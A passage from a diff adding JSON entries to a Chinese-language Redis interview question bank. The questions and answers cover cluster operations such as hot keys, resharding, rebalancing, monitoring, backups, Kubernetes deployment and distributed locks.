+      "answer": "Redis 集群中热点 Key 问题及解决方案：热点 Key 指被大量请求频繁访问的某个 key（如明星微博、热门商品信息），会导致该 key 所在节点负载极高而其他节点空闲。解决方案：1）多副本分散：将热点 key 复制多份存储在不同节点（如 hot_key#1, hot_key#2, ..., hot_key#N），客户端随机选取一个副本访问；2）本地缓存前置：在应用层增加 Caffeine/Guava 本地缓存，降低访问 Redis 频率；3）读写分离：热点 key 的读请求分配到该节点的从节点（READONLY），前提是能容忍轻微延迟；4）限流保护：对热点 key 的请求单独做限流和排队，超出限流返回默认值或降级数据；5）提前预热：预判热点提前将数据加载到多级缓存；6）热点自动检测和迁移：监控各 key 的访问频率（通过 OBJECT FREQ），识别热 key 后自动触发多副本策略；7）使用代理层（如 Twemproxy、Codis）：在代理层做请求合并和缓存。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中的热点 Key 问题如何解决（如使用本地缓存、将热点 key 打散） ?"
+    },
+    {
+      "number": 227,
+      "id": "Redis 数据库面试题-227",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群性能调优的入手方向：1）合理分配哈希槽：避免数据倾斜（某些节点槽过多），使用 rebalance 均衡；2）网络优化：低延迟网络（同机房部署）、万兆网卡、TCP 参数调优（tcp-backlog、tcp-keepalive）；3）内存优化：设置合理的 maxmemory 和淘汰策略、使用紧凑内部编码、定期清理大 key 和碎片；4）Pipeline 批量操作：减少网络往返次数；5）使用连接池：避免频繁 TCP 握手和断开；6）读写分离：从节点分担读压力（READONLY），但需关注数据延迟；7）持久化调优：AOF fsync 设为 everysec、合理设置 RDB save 间隔；8）开启多线程 I/O（6.0+）：配置 io-threads；9）SLOWLOG 持续监控和优化慢命令；10）Lua 脚本优化：将多步操作合并为原子脚本执行减少网络往返；11）集群层面：cluster-node-timeout 合理配置、限制集群规模以免 Gossip 开销过大；12）客户端优化：智能客户端缓存槽映射、避免不必要的 MOVED 重定向。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的性能调优可以从哪些方面入手（合理分配哈希槽、优化网络、调整节点内存、使用管道） ?"
+    },
+    {
+      "number": 228,
+      "id": "Redis 数据库面试题-228",
+      "category": "Redis 数据库",
+      "answer": "在 Kubernetes 中部署 Redis 集群的挑战和解决方案：挑战：1）Pod 网络标识不稳定（Pod 重启 IP 改变），Redis 集群基于 IP 做节点标识和通信；2）持久化存储（RDB/AOF 文件）需绑定到 Pod 生命周期；3）Gossip 协议需要节点间通信端口互通（客户端端口 + 集群总线端口）；4）集群扩缩容需要重配槽分配而非简单的副本数调整。解决方案：1）StatefulSet 部署：提供稳定的 Pod 名称（pod-0, pod-1...）和稳定的网络标识（Headless Service），pod 重启后名称不变；2）PVC（PersistentVolumeClaim）绑定：每个 Pod 挂载独立持久卷存储 RDB/AOF 和 nodes.conf 文件；3）Headless Service + 额外 Service 暴露集群和总线端口；4）使用 Redis Operator（如 spotahome/redis-operator）自动化集群部署、槽分配、故障转移和备份；5）使用 Helm Charts 简化部署；6）注意 K8s 版的故障检测：可能因 Pod 重启和 IP 变化需要更长的 cluster-node-timeout。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Kubernetes 环境中部署 Redis 集群有哪些挑战和解决方案（StatefulSet、Headless Service、存储卷） ?"
+    },
+    {
+      "number": 229,
+      "id": "Redis 数据库面试题-229",
+      "category": "Redis 数据库",
+      "answer": "Redis Operator（如 Spotahome/redis-operator）简化 Redis 集群在 K8s 上的部署和管理：1）声明式部署：通过 Custom Resource Definition（CRD）定义 Redis 集群的期望状态（节点数、主从比、存储大小、镜像版本等），Operator 自动将实际状态对齐到期望状态；2）自动化运维：自动创建 StatefulSet、Service、PVC；自动初始化集群（CLUSTER MEET 和槽分配）；自动从节点绑定；自动故障检测和故障转移；3）自动扩缩容：修改 CR 中的节点数，Operator 自动 reshared 和 rebalance，在线扩缩容不影响服务；4）自动备份：定时触发 BGSAVE 并将 RDB 文件上传到对象存储（S3/OSS）；5）监控集成：自动暴露 Prometheus Metrics；6）滚动升级：有序更新 Redis 版本而不断服；7）对比手动部署：手动部署需执行多步命令（配置文件+启动+CLUSTER MEET+分配槽+配置从节点+健康检查），Operator 一键搞定。注意：Operator 选择要评估社区活跃度、版本兼容性和生产成熟度。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis Operator（如 Spotahome/redis-operator）如何简化 Redis 集群在 K8s 上的部署和管理 ?"
+    },
+    {
+      "number": 230,
+      "id": "Redis 数据库面试题-230",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群（开源）与 Redis 企业版（Redis Enterprise）在功能和部署上的异同：1）开源集群：去中心化 P2P 架构，基于 Gossip 协议，手动或半自动管理，无控制台。Redis 企业版：中心化管理（Management UI/API），节点由管理平面统一管控。2）数据分片：开源用 16384 个哈希槽，企业版支持更灵活的分片策略和自动再平衡。3）持久化：开源支持 RDB+AOF，企业版在此基础上增加了多级存储（热数据在 RAM、温冷数据在 SSD/Flash→Redis on Flash）。4）高可用：开源主从+自动故障转移，企业版支持 Active-Active 多活复制（CRDT 实现）、跨地域灾备。5）性能优化：企业版做了代理层（DMC Proxy）连接复用和请求合并，性能更高。6）安全：企业版提供 RBAC、审计日志、加密等企业级安全特性。7）成本：开源免费、社区支持；企业版商业授权、厂商支持。选型建议：小规模自建用开源，大规模、多活、企业级需求考虑企业版。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群与 Redis 企业版（Redis Enterprise）在功能和部署上有何异同 ?"
+    },
+    {
+      "number": 231,
+      "id": "Redis 数据库面试题-231",
+      "category": "Redis 数据库",
+      "answer": "Redis 开源集群不支持跨地域的主动-主动复制（Active-Active Replication）。开源 Redis 的主从复制是单向异步的（主→从），不支持双主互写。实现跨地域写入的方案：1）Redis 企业版（Redis Enterprise）：基于 CRDT（Conflict-Free Replicated Data Types）实现 Active-Active 多活复制，支持多地同时写入、自动冲突解决；2）第三方工具：通过应用层双写（同时写两个地域的 Redis），接受最终一致性和应用层冲突解决；3）基于 binlog 异步同步方案：监听一个地域 Redis 的写操作，异步同步到另一地域（类似 RedisShake、Redis-Migrate-Tool）；4）云厂商方案：AWS 的 Global Datastore for Redis（主动-被动）、阿里云 Tair 全球多活；5）注意：跨地域网络延迟高（通常 50-300ms），即使解决了多写问题，性能体验也远不如本地读写。通常做法是地域内 Redis + 跨地域异步同步（如通过消息队列或 binlog 同步）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是否支持跨地域的主动-主动复制（需要通过第三方工具或 Redis 企业版实现） ?"
+    },
+    {
+      "number": 232,
+      "id": "Redis 数据库面试题-232",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的自动均衡（Rebalance）是指重新分配哈希槽使得各主节点的槽数趋于均匀。工作机制：1）执行 redis-cli --cluster rebalance host:port 启动；2）工具分析各主节点当前的槽数，计算平均值（16384/主节点数）；3）对于槽数超过平均值的节点，将其多余槽迁移到槽数不足的节点；4）支持参数：--cluster-weight <node_id=w> 为节点设置权重（权重越大的节点最终分配的槽越多）；--cluster-use-empty-masters 允许向空主节点迁移槽；--cluster-simulate 模拟执行不实际迁移（查看计划）；5）逐个槽使用 MIGRATE 迁移数据，在线执行不影响服务；6）Rebalance 不会迁移没有主节点的槽或故障节点的槽；7）执行 Rebalance 时建议在业务低峰期进行（迁移过程消耗网络带宽和 CPU）；8）Rebalance 完成后集群状态保持 OK（cluster_state: ok）。适用场景：扩容/缩容后槽分布不均。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis 集群的自动均衡（Rebalance）它如何重新分配哈希槽 ?"
+    },
+    {
+      "number": 233,
+      "id": "Redis 数据库面试题-233",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的 cluster-migration-barrier 参数（默认 1）作用：控制的是当某个主节点故障时，从其从节点中自动迁移（提升）一个作为新主节点的前提条件——这个主节点至少需要有多少个可以正常工作的从节点后，多余的从节点才可以被迁移到其他孤儿主节点（没有从节点或者从节点故障的主节点）下做从节点备份。具体来说：当某个主节点的从节点数量 > cluster-migration-barrier 时，集群自动将其多余的从节点（replica migration）分配给没有从节点的主节点。例如 cluster-migration-barrier=2，某主节点有 3 个从节点，则 3-2=1 个从节点可以被迁移到无主从节点的主节点下。这种机制增强了集群的自我愈合能力。但注意 replica migration 可能导致被迁移的从节点需要全量同步新主节点的数据。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的 cluster-migration-barrier 参数的作用是什么（控制主节点至少需要的从节点数量） ?"
+    },
+    {
+      "number": 234,
+      "id": "Redis 数据库面试题-234",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群默认无法直接将从节点配置为优先服务于特定 IP 或机架的客户端，因为 Redis 的 Gossip 协议和节点的通信不感知物理拓扑。但可以通过以下方案间接实现：1）智能客户端（如 Lettuce）的 ReadFrom 策略：Lettuce 支持 ReadFrom.NEAREST、ReadFrom.LOWEST_LATENCY 等拓扑感知路由策略（根据 latency 选择最近的从节点读取）；2）客户端侧 DNS：在不同机架/IDC 部署不同的集群 VIP 或 DNS 解析（如 redis-slave-rack1.internal、redis-slave-rack2.internal），客户端连对应入口；3）应用层路由：在应用中维护一份优先从节点 IP 列表，读请求优先访问同机架的从节点；4）Redis 企业版：支持机架感知和就近读取（Rack-Awareness）。原生开源 Redis 集群不直接提供此能力。推荐在客户端侧（如 Lettuce ReadFrom.ANY_REPLICA 配合 Spring Data 的自定义路由规则）实现，无需修改 Redis 配置。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中的从节点能否被配置为优先服务于特定 IP 或机架的客户端（无法直接配置，可通过客户端智能路由实现） ?"
+    },
+    {
+      "number": 235,
+      "id": "Redis 数据库面试题-235",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群模式下使用 INFO 命令获取集群整体统计信息的方法：1）INFO 命令获取的是当前连接节点的统计信息（非全集群统计），需要分别查询每个节点并汇总；2）逐个节点查询并汇总：连接每个主节点→执行 INFO stats/INFO memory/INFO replication 等→将各节点的 keyspace_hits、keyspace_misses、used_memory、total_commands_processed 等指标累加得到全集群数据；3）一键执行：redis-cli --cluster call host:port INFO stats 在所有节点执行同一命令输出结果；4）监控系统自动汇总：使用 Prometheus redis_exporter 采集所有节点→Prometheus 聚合查询（sum by(...) 等）→Grafana 展示全集群趋势；5）关键指标注意：某些指标（如 instantaneous_ops_per_sec）不能直接累加（需分别观察各节点的趋势），而 keyspace_hits 等计数型指标可以累加；6）CLUSTER INFO 可获取集群层面的状态信息（节点数、槽分配、当前 epoch 等），是全局性的而非单节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群模式下，如何使用 INFO 命令获取集群的整体统计信息（需要分别查询每个节点） ?"
+    },
+    {
+      "number": 236,
+      "id": "Redis 数据库面试题-236",
+      "category": "Redis 数据库",
+      "answer": "监控 Redis 集群延迟的方法：1）Redis 内置 Latency Monitor：CONFIG SET latency-monitor-threshold 100（启用延迟监控，记录超过 100ms 的操作）；LATENCY LATEST 查看最近的延迟事件（命令、时间戳、延迟 ms）；LATENCY DOCTOR 获取诊断建议；LATENCY GRAPH event 以 ASCII 图展示延迟趋势；LATENCY RESET 重置统计。2）客户端侧采集：在应用代码中记录 Redis 命令的耗时（AOP 或 SDK 提供），统计 P50/P99 延迟。3）redis-cli --latency：实时测量到 Redis 的网络 RTT（PING 往返延迟）；redis-cli --latency-history 显示历史延迟变化；redis-cli --latency-dist 展示延迟分布。4）Prometheus + Grafana：通过 redis_exporter 采集延迟相关指标（如 commands_duration_seconds 的 bucket 分布）。5）集群特别注意：跨节点请求通过 MOVED/ASK 重定向会增加额外 RTT，监控时区分单节点延迟和含重定向的总延迟。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何监控 Redis 集群的延迟（如通过 Redis latency monitor、客户端采集） ?"
+    },
+    {
+      "number": 237,
+      "id": "Redis 数据库面试题-237",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的慢查询日志记录机制：每个节点独立记录慢查询，不共享、不汇总。1）配置（每个节点独立配置）：slowlog-log-slower-than（微秒，如 10000=10ms）和 slowlog-max-len（最多保留条目数）；2）查看：SLOWLOG GET N 获取该节点的慢查询记录；3）分节点查询：需要连接每个集群节点分别执行 SLOWLOG GET，汇总分析全集群的慢查询；4）批量查询所有节点：redis-cli --cluster call host:port SLOWLOG GET 10 在所有节点执行；或用脚本遍历 CLUSTER NODES 中的每个节点逐一获取；5）慢查询内容：包含 id、时间戳、执行耗时（微秒）、命令及参数、4.0+ 包含客户端 IP:PORT、客户端名称；6）监控自动化：定期从所有节点采集慢查询日志并存入集中分析系统（如 ELK/Loki），统一展示和告警；7）分析时需区分慢查询来自哪个节点（需要在记录中附加节点标识）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的慢查询日志是如何记录的（每个节点独立记录，需分别查询） ?"
+    },
+    {
+      "number": 238,
+      "id": "Redis 数据库面试题-238",
+      "category": "Redis 数据库",
+      "answer": "诊断 Redis 集群出现 (error) CLUSTERDOWN The cluster is down 错误：1）根本原因：集群中有哈希槽没有可用的服务节点（某些槽对应的主节点宕机且没有从节点可提），集群进入 FAIL 状态拒绝服务。2）排查步骤：A）执行 CLUSTER INFO 查看 cluster_state（应为 fail）和 cluster_slots_not_ok（未正常服务的槽数）；B）执行 CLUSTER NODES 查看各节点状态，找出 flag 中包含 fail 的节点以及没有从节点的孤立主节点；C）确定哪些槽不可用（CLUSTER NODES 输出中 fail 节点负责的槽）。3）修复方案：A）如果有从节点但未自动切换：手动在从节点执行 CLUSTER FAILOVER TAKEOVER；B）如果有宕机主节点的备用持久化文件：恢复该节点并重启；C）如果节点永久丢失：用 CLUSTER FORGET 移除故障节点→新加节点→reshard 分配槽（但原数据永久丢失）；D）如果确认某些槽数据可以丢弃：CLUSTER SETSLOT slot NODE 新节点、cluster-require-full-coverage no 设为允许不完整槽。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何诊断 Redis 集群中出现的 (error) CLUSTERDOWN The cluster is down 错误 ?"
+    },
+    {
+      "number": 239,
+      "id": "Redis 数据库面试题-239",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群 reshard 操作对性能的影响：1）数据迁移开销：每个槽的迁移涉及源节点批量读取 key → 序列化 → 网络发送 → 目标节点接收 → 反序列化 → 写入。大量槽迁移消耗 CPU 和网络带宽。2）MIGRATE 原子操作：每个 key 的 MIGRATE 在源节点执行时对该 key 加锁（key 迁移期间不可用），迁移过程中源节点对该 key 的请求被暂时阻塞（时间极短，通常微秒级）；3）带宽消耗：迁移过程中源和目标节点间的数据传输增加网络带宽使用；4）ASK 重定向开销：客户端请求已迁移的 key 时需经过 ASK 重定向（额外 RTT）；5）建议：A）在业务低峰期执行 reshard；B）分批迁移（少量多次而非一次性迁移大量槽）；C）使用 --cluster-reshard 的 --pipeline 参数加速迁移（批量发送多条命令）；D）监控迁移进度和集群 QPS/延迟变化；E）可设置迁移速率限制（通过 redis-cli --cluster reshard 的 migrate 工具参数）；6）小批量迁移（如 100 个槽）对在线服务影响较小，大批量迁移建议错峰。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中的 reshard 操作对性能有何影响（会涉及数据迁移，可能影响服务） ?"
+    },
+    {
+      "number": 240,
+      "id": "Redis 数据库面试题-240",
+      "category": "Redis 数据库",
+      "answer": "选择 reshard 操作的迁移粒度（逐个槽 vs 批量迁移）：1）默认方式（逐个槽迁移）：redis-cli --cluster reshard 对每个槽依次执行 MIGRATE，逐个 key 迁移（支持 --pipeline 批量迁移单个槽内的 key）。优点：细粒度控制、出错只影响单个槽、可随时中断和恢复；缺点：大量槽（如 1000+）耗时较长。2）批量迁移多个槽：通过参数指定迁多个槽，工具逐个槽处理，非并行。3）选择策略：A）少量槽（<100）直接逐个迁移即可；B）大量槽（1000+）且业务低峰期足够长，可以一次性迁移全部；C）如果担心影响在线服务，可以分多批迁移（每次一小部分，间隔观察集群状态）；D）槽内 key 很多时使用 --pipeline 参数（单槽内部批量发送 MIGRATE 而非一个 key 一次 MIGRATE）；4）注意：不能同时迁移两个槽（工具是串行逐个槽处理的），如果要并行加速需同时开多个 reshard 进程（迁移不同的槽），但这会加剧集群负载压力。",
+      "tags": [],
+      "question": "请简述如何选择 reshard 操作的迁移粒度（逐个槽迁移还是批量迁移） ?"
+    },
+    {
+      "number": 241,
+      "id": "Redis 数据库面试题-241",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群 rebalance 操作根据各节点持有的槽数量不平衡程度来决定迁移哪些槽：1）计算当前槽分布：分析 CLUSTER NODES 中各主节点负责的槽范围（计算每个主节点的槽总数）；2）计算目标分布：total_slots(16384) / 主节点数量 = 每个节点应持有的平均槽数；如果设置了权重（--cluster-weight），目标分布按权重调整（权重高的节点分到更多槽）；3）找出过剩和不足的节点：持有槽数 > 目标值的节点是迁移来源；持有槽数 < 目标值的节点是迁移目标；4）选择迁移的槽：从来源节点的槽中选取要迁移的槽（通常来源节点选择自己负责的槽列表中末尾的槽），使得迁移后来源节点槽数更接近目标值；5）自动计算并展示迁移计划：工具显示从哪个节点迁移多少槽到哪个节点，用户确认后执行；6）也可用 --cluster-simulate 参数仅计算和展示计划但不执行；7）rebalance 与 reshard 不同：rebalance 是自动多对多的均衡，reshard 是手动指定来源和目标的一对一或一对多迁移。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的 rebalance 操作是如何决定迁移哪些槽的（根据节点持有槽的数量） ?"
+    },
+    {
+      "number": 242,
+      "id": "Redis 数据库面试题-242",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群节点配置文件和持久化文件管理备份：1）nodes.conf（集群配置文件）：记录节点 ID、集群中所有节点的信息（IP:PORT、node_id、flags、slot 分配、configEpoch 等），必须保留备份。丢失后节点重启无法识别自己在集群中的身份，需要重新加入集群。2）dump.rdb（RDB 文件）：数据快照，定期备份（异地/云存储），保留多个版本（如最近 7 天）；3）appendonly.aof（AOF 文件）：写操作日志，可与 RDB 一起备份或单独备份；4）备份策略：A）定时从从节点备份避免影响主节点性能：crontab 定时 BGSAVE → rsync/scp 到备份服务器/S3；B）使用 BGREWRITEAOF 压缩 AOF 后备份避免文件过大；C）Redis 配置文件（redis.conf）也需要备份和版本管理；5）恢复验证：定期从备份文件恢复测试（恢复到一个隔离的 Redis 实例验证数据完整性）；6）注意：nodes.conf 备份是最容易忽略的——没有它，即使有 RDB/AOF 文件集群恢复也极其困难和容易出错。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中的节点配置文件和持久化文件（RDB/AOF）应如何管理备份 ?"
+    },
+    {
+      "number": 243,
+      "id": "Redis 数据库面试题-243",
+      "category": "Redis 数据库",
+      "answer": "当 Redis 集群中某个节点因物理机故障永久丢失时，用新节点替换的步骤：1）从集群中移除旧节点：redis-cli --cluster del-node host:port <old_node_id>。如果旧节点是主节点且负责槽，先要 migrate 槽到其他节点才能移除；如果是从节点，可直接移除。2）如果旧节点是主节点且槽数据未备份：槽数据永久丢失，这些槽空出来后需 reshard 分配给其他节点（数据不可恢复——这就是为什么每个主节点必须有从节点的原因）。3）启动新 Redis 实例作为替补节点；4）使用 redis-cli --cluster add-node <new_host:port> <existing_host:port> --cluster-slave --cluster-master-id <target_master_id> 将新节点加入集群作为从节点；5）如果替换的是主节点：A）先加入新从节点复制已有数据；B）CLUSTER FAILOVER 手动切换到新节点成为主节点（这样数据不丢失）。6）CLUSTER FORGET <old_node_id> 确保所有节点都忘记旧节点（del-node 已做此操作）。7）验证新节点的复制和集群状态。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述当 Redis 集群中的某个节点因物理机故障永久丢失时，如何用新的节点替换它（CLUSTER FORGET 旧节点，启动新节点加入集群） ?"
+    },
+    {
+      "number": 244,
+      "id": "Redis 数据库面试题-244",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的未来发展趋势：1）Redis 7.0/7.2/8.0 的新特性持续改进集群：7.0 带来了改进的内存管理（listpack 替代 ziplist）、更好的 AOF 重写机制、ACL 增强；7.2 增强了集群错误处理和客户端缓存；8.0 继续优化集群规模和性能。2）云原生融合：Kubernetes Operator 更成熟、支持服务网格（如 Istio 集成）、更友好的弹性伸缩；3）Serverless Redis：云厂商推出的按需付费自动伸缩的 Redis 服务（如 AWS ElastiCache Serverless）；4）向量搜索能力：Redis Stack 集成了向量相似度搜索（RediSearch 的向量功能），使 Redis 成为大模型 RAG 场景的高性能向量数据库；5）更强的多活/CRDT：企业版推动跨地域多活能力持续增强；6）数据湖/HTAP：Redis 逐渐补充分析能力（RedisGears、RedisTimeSeries）；7）开源集群的体验改进：Gossip 协议优化以支持更大规模、自动再平衡、更友好的运维工具。Redis 正从单纯的缓存/数据库向综合性实时数据平台演进。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的未来发展趋势是什么（如对 Redis 7.0/8.0 新特性的支持、与云原生生态的融合） ?"
+    },
+    {
+      "number": 245,
+      "id": "Redis 数据库面试题-245",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的直连模式与代理模式对比：1）直连模式（Direct Route / Smart Client）：客户端（如 JedisCluster、Lettuce、go-redis Cluster）直接连接 Redis 节点，自行计算哈希槽并路由请求到对应节点。优点：无代理层额外延迟、无单点故障、性能最高；缺点：客户端逻辑复杂、需要集群拓扑感知、客户端库必须支持集群协议。2）代理模式：在客户端和 Redis 集群之间增加代理层，如 Twemproxy（Twitter）、Codis（豌豆荚）、Redis Cluster Proxy（Redis 官方 6.0+）。代理负责分片路由、连接池管理，客户端只需连接代理而无集群感知。优点：简化客户端（任何 Redis 客户端即可）、连接复用、统一管理入口、可加额外功能（限流、审计）；缺点：增加一层网络延迟和代理自身的性能瓶颈及单点风险（需多代理+负载均衡解决）。3）选择建议：微服务内部、客户端可控用直连模式；多语言/多团队环境、客户端不可控用代理模式。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis 集群的直连模式（Direct Route）与代理模式（如 Twemproxy、Codis、Redis Cluster Proxy） ?"
+    },
+    {
+      "number": 246,
+      "id": "Redis 数据库面试题-246",
+      "category": "Redis 数据库",
+      "answer": "使用代理模式（如 Twemproxy）与 Redis 原生集群的优缺点对比：Twemproxy（nutcracker）优点：1）客户端无感知分片（任何标准 Redis 客户端都可以连接），开发成本低；2）连接池管理与多路复用，减少 Redis 后端连接压力；3）简单轻量，配置和部署门槛低；4）支持一致性哈希等多种分片算法，扩缩容支持较好。缺点：1）不支持 Redis 集群的所有命令（如事务、Lua 脚本、Pub/Sub、Scan 等受限）；2）多一层网络延迟（通常增加 0.5-2ms）；3）代理本身单点故障（需多代理+F5/LVS+keepalived 做高可用）；4）无故障转移能力（需配合 Sentinel 或手动切换）；5）扩缩容需停服或手动数据迁移。Redis 原生集群优点：1）无代理层延迟、无单点（去中心化）；2）自动故障转移；3）在线 reshard 和 rebalance 无需停服；4）支持所有集群命令（除跨 slot 操作）。缺点：1）客户端要求高（必须支持集群协议）；2）运维复杂度（需要管理节点拓扑和 Gossip 状态）；3）跨 slot 操作受限。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述使用代理模式（如 Twemproxy）与 Redis 原生集群相比，优缺点是什么 ?"
+    },
+    {
+      "number": 247,
+      "id": "Redis 数据库面试题-247",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的 redis-cli --cluster fix 命令用于自动修复集群问题，在以下情况下使用：1）发现槽分配不一致：CLUSTER NODES 在各节点上返回不同的槽分配信息（如两个节点声称拥有同一槽），fix 根据多数节点的记录和 configEpoch 裁决正确归属。2）有处于 MIGRATING/IMPORTING 状态的槽卡住（迁移中断）：fix 会尝试回滚或完成迁移。3）有未分配的槽（open slot）：fix 会尝试将这些槽分配给有能力的节点。4）节点配置信息矛盾：fix 尝试统一各节点的配置。使用注意：A）fix 前先执行 check（redis-cli --cluster check）了解问题；B）fix 会自动修改节点配置，有潜在风险，执行前应备份所有节点的 nodes.conf 和持久化文件；C）fix 不是万能药——某些严重的数据损坏（如 RDB/AOF 文件损坏）无法通过 fix 修复；D）在业务低峰期执行 fix 并提前通知可能短暂影响服务。fix 主要用于纠正 Gossip 传播异常导致的配置不一致问题。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis 集群的 redis-cli --cluster fix 命令它在什么情况下使用（修复集群问题，如槽不一致） ?"
+    },
+    {
+      "number": 248,
+      "id": "Redis 数据库面试题-248",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中实现分布式锁（Redlock 算法）：1）单节点 Redis 分布式锁在集群中的问题：锁只在单个主节点创建，如果主节点宕机而从节点未同步该锁数据，从节点提升为新主后锁丢失，其他客户端可能获取到同一把锁（安全性被破坏）。2）Redlock 算法（Redis 官方提出）：在 N 个完全独立的 Redis 节点上（通常 5 个，不一定是集群节点，是独立实例），依次尝试加锁。如果能在大多数节点（≥N/2+1）上成功加锁且总耗时 < 锁的过期时间，则认为加锁成功。释放锁时向所有节点发送释放命令。3）集群中使用建议：A）Redlock 要求 N 个节点完全独立（不能是主从关系、不共享持久化、不共享网络），避免共享故障域；B）Redlock 有争议（Martin Kleppmann 认为不能保证安全性，见 antirez 的辩论）；C）对极高安全要求的场景，考虑 ZooKeeper 或 etcd 实现分布式锁（强一致性）；D）一般场景使用单 Redis + 合理的过期时间和业务幂等足够（即使极低概率锁丢失，业务幂等也能兜底）。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "请简述如何在 Redis 集群中实现分布式锁（需要考虑锁的跨节点传播，通常使用 Redlock 算法） ?"
+    },
+    {
+      "number": 249,
+      "id": "Redis 数据库面试题-249",
+      "category": "Redis 数据库",
+      "answer": "Redlock 算法在 Redis 集群环境下的可靠性争议：1）支持方（antirez/Redis 作者）：Redlock 在 N 个独立 Redis 节点上实现多数派加锁，只要多数节点正常工作就能保证锁的安全性（互斥性）。通过设置合理的超时时间（远小于锁的有效期）处理节点故障和网络延迟。2）反对方（Martin Kleppmann/Kafka 作者）：Redlock 无法提供真正的安全性，原因是：a）Redis 节点没有严格的时间保证（时钟跳跃、GC 暂停），锁到期判断依赖系统时间，而时间不可靠；b）网络延迟和进程挂起可能使客户端的锁在不知情的情况下过期，其他客户端可能同时获取到锁（fencing token 可以缓解但算法本身未包含）；c）没有持久化保证，节点重启后锁状态丢失。3）实际建议：A）对数据准确性和安全性要求极高的场景（如金融交易），使用 ZooKeeper/etcd（强一致性+临时节点+Session 机制）实现分布式锁；B）一般场景（如防重复提交、流量控制）用单 Redis SET NX + 合理 TTL + 业务幂等足够；C）Redlock 可作为多个独立 Redis 实例时的增强方案但不要认为它绝对安全。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redlock 算法在 Redis 集群环境下是否依然可靠有哪些争议 ?"
+    },
+    {
+      "number": 250,
+      "id": "Redis 数据库面试题-250",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群中 WATCH 命令支持事务，但在多键场景下有严格限制：WATCH 监视的所有 key 必须在同一个哈希槽（同一个节点）上。因为事务（MULTI/EXEC）本身要求所有操作的 key 在同一节点，WATCH 作为事务的前置操作也遵循同样的限制。跨节点的 WATCH 需要分布式事务协调，Redis 集群不支持。解决方案：1）使用 Hash Tag 确保相关 key 在同一槽（如 WATCH {order:123}:stock {order:123}:balance，只对 {} 内的 order:123 做 CRC16）；2）如果业务确需跨节点监视多个 key，在应用层重新设计数据模型，将关联数据通过 Hash Tag 聚集；3）使用分布式协调工具（ZooKeeper/etcd）实现跨节点的乐观锁；4）将乐观锁逻辑改为单节点 Lua 脚本实现——Lua 脚本在单节点内原子执行，但同样有跨 slot 限制。WATCH+MULTI+EXEC 在集群中的使用场景因此比单机模式受到更多约束。",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "请简述Redis 集群中的 WATCH 命令支持事务吗在多键场景下有什么限制 ?"
+    },
+    {
+      "number": 251,
+      "id": "Redis 数据库面试题-251",
+      "category": "Redis 数据库",
+      "answer": "评估 Redis 集群内存容量需考虑以下因素：1）数据量估算：key 数量 × 平均 value 大小 + key 元数据开销（每个 key 约 50-70 字节元数据，取决于内部编码）；2）副本开销：每个主节点有 N 个从节点时，总内存 = 主节点内存 × (从节点数+1)，例如 3 主 3 从：总内存 = 3 × 数据量 × 2（主+从）= 6 倍数据量；3）内存碎片：jemalloc 的碎片率通常 1.05-1.3，预留 30% 余量（实际 used_memory_rss = used_memory × 碎片率）；4）缓冲区内存：客户端缓冲区（每个客户端约 16KB）、复制缓冲区（repl-backlog-size 默认 1MB）、AOF 缓冲区等；5）fork 子进程 COW 开销：BGSAVE/BGREWRITEAOF 时可能造成瞬间内存翻倍（写入频繁时），预留至少 50% 额外内存；6）扩容空间：预留 20-30% 容量用于数据增长和峰值流量；7）公式：建议单节点 maxmemory = (数据量 + 预留增长) × 1.5（COW 和碎片）/ 主节点数。例如总数据 30GB、3 主 3 从→约每主节点 maxmemory 15-20GB。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何评估 Redis 集群的内存容量需要考虑哪些因素（数据量、复制开销、内存碎片） ?"
+    },
+    {
+      "number": 252,
+      "id": "Redis 数据库面试题-252",
+      "category": "Redis 数据库",
